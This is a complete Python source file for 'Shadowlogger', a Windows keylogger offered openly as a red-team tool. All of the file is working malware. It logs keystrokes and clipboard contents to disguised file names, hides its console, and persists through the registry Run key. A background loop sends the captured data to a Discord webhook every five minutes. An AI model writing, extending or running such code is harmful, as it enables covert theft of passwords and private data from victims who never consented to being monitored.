# Shadowlogger - Open Source Keylogger for Red Team Use
# Author: SyedSharjeelZaidi
# License: MIT
# https://github.com/syedsharjeelshah/Shadowlogger

import os
import ctypes
import winreg
import win32clipboard
import threading
import requests
import time
import argparse
from pynput import keyboard

KEYLOG_FILE = "syscache.log"
CLIPBOARD_FILE = "clipdata.log"
WEBHOOK_URL = None

def hide_console():
    """Hide console window for stealth mode."""
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass

def add_to_startup(app_name="Shadowlogger"):
    """Add this script to Windows registry for persistence."""
    try:
        file_path = os.path.abspath(__file__)
        reg_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_ALL_ACCESS
        )
        winreg.SetValueEx(reg_key, app_name, 0, winreg.REG_SZ, file_path)
        winreg.CloseKey(reg_key)
    except Exception:
        pass

def log_clipboard():
    """Capture clipboard contents when Ctrl+V is pressed."""
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        with open(CLIPBOARD_FILE, 'a', encoding='utf-8') as f:
            f.write(f"[CLIPBOARD] {data}\n")
    except:
        pass

def log_keystroke(key):
    """Log each keystroke to a file."""
    try:
        with open(KEYLOG_FILE, 'a', encoding='utf-8') as f:
            if hasattr(key, 'char') and key.char:
                f.write(key.char)
            elif key == key.space:
                f.write(' ')
            else:
                f.write(f'[{str(key)}]')
    except Exception:
        pass

    # Trigger clipboard logging on Ctrl + V
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        log_clipboard()

def send_logs():
    """Send logs to Discord webhook, if configured."""
    if WEBHOOK_URL:
        try:
            with open(KEYLOG_FILE, 'r', encoding='utf-8') as f:
                keys = f.read()
            if keys.strip():
                requests.post(WEBHOOK_URL, data={"content": f"🧩 Keystrokes:\n```{keys}```"})

            with open(CLIPBOARD_FILE, 'r', encoding='utf-8') as f:
                clips = f.read()
            if clips.strip():
                requests.post(WEBHOOK_URL, data={"content": f"📋 Clipboard:\n```{clips}```"})
        except:
            pass

def exfil_loop(interval=300):
    """Run periodic log sending every X seconds."""
    while True:
        send_logs()
        time.sleep(interval)

def main():
    parser = argparse.ArgumentParser(description="Shadowlogger - Open Source Keylogger")
    parser.add_argument('--webhook', help='Discord webhook URL to send logs to')
    parser.add_argument('--stealth', action='store_true', help='Hide console window')
    parser.add_argument('--persist', action='store_true', help='Add to Windows startup')
    args = parser.parse_args()

    global WEBHOOK_URL
    if args.webhook:
        WEBHOOK_URL = args.webhook

    if args.stealth:
        hide_console()
    if args.persist:
        add_to_startup()

    # Start exfiltration thread (if webhook provided)
    if WEBHOOK_URL:
        threading.Thread(target=exfil_loop, daemon=True).start()

    # Start keylogger listener
    with keyboard.Listener(on_press=log_keystroke) as listener:
        listener.join()

# Entry point
if __name__ == "__main__":
    main()
